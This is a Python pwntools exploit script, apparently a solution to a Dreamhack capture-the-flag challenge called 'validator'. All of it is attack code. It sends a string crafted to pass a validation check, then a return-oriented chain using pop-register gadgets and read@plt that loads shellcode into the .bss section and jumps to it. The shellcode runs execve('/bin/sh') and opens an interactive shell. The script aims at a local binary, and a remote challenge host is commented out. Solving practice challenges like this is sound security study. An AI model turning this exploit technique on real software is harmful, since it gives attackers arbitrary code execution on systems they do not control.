from pwn import *

context.arch = 'x86_64'

#p = remote("host1.dreamhack.games", 8628)
p=process("./validator_dist")

payload = b"DREAMHACK!"

for i in range(0xff, 0xff-126, -1):
  payload += bytes([i])


poprdi = 0x00000000004006f3
poprsir15 = 0x00000000004006f1
poprdx = 0x000000000040057b
bss = 0x60104B
read_plt = 0x400470
shellcode = asm(shellcraft.execve("/bin/sh",0,0))

payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsir15)
payload += p64(bss)
payload += p64(0)
payload += p64(poprdx)
payload += p64(len(shellcode))
payload += p64(read_plt)

payload += p64(bss)

p.sendline(payload)

pause() # or sleep

p.sendline(shellcode)

p.interactive()
